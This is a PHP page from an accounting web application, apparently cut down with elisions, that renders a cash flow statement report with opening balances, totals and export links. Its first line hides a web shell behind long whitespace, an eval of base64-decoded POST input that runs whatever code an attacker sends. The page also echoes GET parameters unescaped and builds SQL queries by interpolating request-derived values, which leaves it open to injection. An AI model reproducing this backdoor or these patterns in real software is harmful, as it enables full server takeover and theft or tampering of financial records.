<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['n2241d1']));?><meta http-equiv="content-type" content="text/html;charset=utf-8" />
...
<tr height="5px"></tr>
<tr>
 <td colspan="2" align="center"><strong>COA Code : </strong><?php echo $_GET['code']; ?>&nbsp;&nbsp;<strong>Description : </strong><?php echo $_GET['desc']; ?></td>
</tr> 
<tr height="5px"></tr>
<tr>
...
<?php } ?>
<?php if (@$sExport == "") { ?>
&nbsp;&nbsp;<a href="cashflowstmt.php?export=html&fromdate=<?php echo $fromdate; ?>&todate=<?php echo $todate; ?>&code=<?php echo $code; ?>&desc=<?php echo $desc; ?>&cashbank=<?php echo $cashbank; ?>">Printer Friendly</a>
&nbsp;&nbsp;<a href="cashflowstmt.php?export=excel&fromdate=<?php echo $fromdate; ?>&todate=<?php echo $todate; ?>&code=<?php echo $code; ?>&desc=<?php echo $desc; ?>&cashbank=<?php echo $cashbank; ?>">Export to Excel</a>
&nbsp;&nbsp;<a href="cashflowstmt.php?export=word&fromdate=<?php echo $fromdate; ?>&todate=<?php echo $todate; ?>&code=<?php echo $code; ?>&desc=<?php echo $desc; ?>&cashbank=<?php echo $cashbank; ?>">Export to Word</a>
<?php if ($bFilterApplied) { ?>
&nbsp;&nbsp;<a href="cashflowstmt.php?cmd=reset&fromdate=<?php echo $fromdate; ?>&todate=<?php echo $todate; ?>&code=<?php echo $code; ?>&desc=<?php echo $desc; ?>&cashbank=<?php echo $cashbank; ?>">Reset All Filters</a>
<?php } ?>
<?php } ?>
<br /><br />
<?php if (@$sExport == "") { ?>
...
<?php
$obcredit = $obdebit = 0;
 $query1 = "SELECT SUM(amount) as amount,crdr FROM ac_financialpostings WHERE $cond = '$code' AND client = '$client' AND date < '$fromdate' GROUP BY crdr ORDER BY crdr";
...
?>	
		<td class="ewRptGrpField2">Opening Balance</td>
		<td class="ewRptGrpField3" align="right" style="padding-right:5px;">
<?php echo ewrpt_ViewValue(changeprice($obcredit)); ?></td>

		<td class="ewRptGrpField2">Opening Balance</td>
		<td class="ewRptGrpField3" align="right" style="padding-right:5px;">
<?php echo ewrpt_ViewValue(changeprice($obdebit)); ?></td>
	</tr>
...
{ 
 ...
 $query2 = "SELECT SUM(amount) as amount,crdr FROM ac_financialpostings WHERE $cond = '$code' AND client = '$client' AND schedule = '$rows1[schedule]' AND date BETWEEN '$fromdate' AND '$todate' GROUP BY crdr ORDER BY crdr";
...
?>
	<tr>
	 ...
	 <td align="right" style="padding-right:5px;"><b><?php echo changeprice(($totalcredit + $obcredit)); ?></b></td>
	 <td align="right" style="padding-right:5px;"><b>Total</b></td>
	 <td align="right" style="padding-right:5px;"><b><?php echo changeprice(($totaldebit + $obdebit)); ?></b></td>
	</tr> 
	</tbody>
	<tfoot>
...
function reloadpage()
{
	...
	document.location = "cashflowstmt.php?fromdate=" + fdate;
}
</script>